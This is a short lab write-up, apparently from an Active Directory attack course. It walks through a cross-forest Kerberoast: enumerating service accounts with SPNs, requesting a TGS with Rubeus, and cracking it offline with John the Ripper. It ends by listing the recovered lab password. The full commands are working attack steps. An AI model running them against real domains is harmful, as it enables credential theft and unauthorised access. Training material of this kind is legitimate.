# Hands-on 22: Cross Forest Attacks - Kerberoast

- [Hands-on 22: Cross Forest Attacks - Kerberoast](#hands-on-22-cross-forest-attacks---kerberoast)
  - [Task](#task)
  - [Find a service account in the eu.local forest and Kerberoast its password](#find-a-service-account-in-the-eulocal-forest-and-kerberoast-its-password)

---

## Task

Find a service account in the eu.local forest and Kerberoast its password.

<br/>

---

## Find a service account in the eu.local forest and Kerberoast its password

First import AD Module:

```
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll; Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

<br/>

Enumerate named service accounts across the forests:

```
Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server $_.Name}
```

![picture 37](images/2ebcaca9b13307f4ecfee9aa85621e94afd7190a4721d2bd2417c3cdad91a564.png)  

- `eu\storagesvc` has a SPN `MSSQLSvc/eu-file.eu.local`

<br/>

To request a TGS of the above:

```
C:\AD\Tools\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:eu-storagesvc.txt
```

![picture 38](images/ceb784310189b284a29e5303ab06b13720c8fdf08ec63b597b47de2ca53d9920.png)  

<br/>

Use `klist` to check the ticket:

![picture 39](images/18b021f4f9fae6e480dd86b37835ed2c3f9d36cf23d34f1d584f9e6da140617c.png)  

<br/>

Use `john.exe` to crack the password:

```
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\Users\studentuser64\eu-storagesvc.txt
```

![picture 40](images/78c5e7e0b37bd1d57b255226aa97d4760c8f9941560eb91bfa347742c531e22d.png)  

Note:
eu\storagesvc
- Password:  `Qwerty@123`

<br/>


